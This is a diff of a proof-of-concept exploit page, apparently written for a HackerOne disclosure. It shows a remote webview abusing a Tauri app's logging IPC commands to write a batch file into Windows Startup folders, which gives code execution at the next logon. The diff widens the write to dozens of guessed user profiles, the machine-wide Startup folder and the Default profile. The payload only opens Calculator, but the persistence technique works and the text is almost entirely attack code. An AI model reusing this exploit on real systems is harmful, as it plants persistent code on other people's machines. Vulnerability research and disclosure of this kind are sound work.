@@ -23,13 +23,13 @@ to write a Startup <code>.bat</code>. The marker written by the .bat is
 /*
  * H1 report 4173777
  * C7: remote webview retains Tauri IPC -> arbitrary file write -> Startup .bat -> logon RCE.
- * The page is intentionally self-contained. It writes:
- *   %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\h1-4173777.<date>.bat
- * containing:
- *   @echo off
- *   echo H1LOGON-251 > C:\Users\Public\h1logon-251.txt
- *   start calc.exe
- * No one runs the .bat manually; it runs at the next logon.
+ *
+ * Note on cross-user delivery: the Tauri path/os plugins are ACL-denied from a
+ * remote origin (and file:// / asset:// origins fail Tauri's origin check), so
+ * this page cannot read %USERNAME%. It therefore tries a broad set of common
+ * Windows profile names and writes to every Startup path that exists, plus the
+ * machine-wide Startup (admin) and the Default profile (new profiles). If none
+ * exist it still proves the arbitrary write under C:\Users\Public.
  */
 (async () => {
   const out = document.getElementById('out');
@@ -45,31 +45,37 @@ to write a Startup <code>.bat</code>. The marker written by the .bat is
     return;
   }
 
-  // The Tauri path/os plugins are ACL-denied from a remote origin, so use the
-  // fixed per-user Startup candidates. The validator's Windows profile will
-  // normally be one of the first entries; the fallback proof still demonstrates
-  // the arbitrary write.
-  const users = ['will', 'h1_analyst_will', 'analyst', 'h1', 'hacker', 'user', 'Administrator', 'pepis #1'];
+  const users = [
+    'user','User','admin','Admin','Administrator','administrator','owner','Owner',
+    'pc','PC','test','Test','guest','Guest','default','Default','windows','Windows',
+    'home','Home','desktop','Desktop','laptop','Laptop','work','Work','main','Main',
+    'me','root','sysadmin','support','info','dev','developer','tester','qa','security',
+    'h1','h1_analyst_will','hacker','analyst','researcher','student','pentest',
+    'bob','alice','john','jane','mike','michael','david','alex','sam','will','william',
+    'james','robert','daniel','chris','matthew','josh','joshua','tyler','brandon',
+    'ethan','noah','liam','emma','olivia','sophia','ava','isabella','mia','charlotte',
+    'kalena','ktester','kalena-tester','kalena_h1','wearehackerone','pepis #1'
+  ];
   const bat = '@echo off\r\necho H1LOGON-251 > C:\\Users\\Public\\h1logon-251.txt\r\nstart calc.exe\r\n';
   const paths = users.map(u =>
     'C:\\Users\\' + u + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1-4173777.bat');
   paths.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1-4173777.bat');
+  paths.push('C:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1-4173777.bat');
 
-  let wrote = null;
+  const wrote = [];
   for (const p of paths) {
     try {
       await inv('set_file_logger_config', { config: { path: p } });
       await inv('write_logs', { messages: [{ logger: 'h1', context: '4173777', level: 'info', text: bat }] });
       await inv('set_file_logger_config', { config: null });
-      wrote = p;
+      wrote.push(p);
       log('WROTE: ' + p);
-      break;
     } catch (e) {
       // next profile
     }
   }
 
-  if (wrote) {
+  if (wrote.length) {
     log('SUCCESS. The file has a date suffix, e.g. h1-4173777.YYYY-MM-DD.bat.');
     log('Open shell:startup to confirm it. Reboot/logoff+logon; Calculator opens and');
     log('C:\\Users\\Public\\h1logon-251.txt contains H1LOGON-251.');
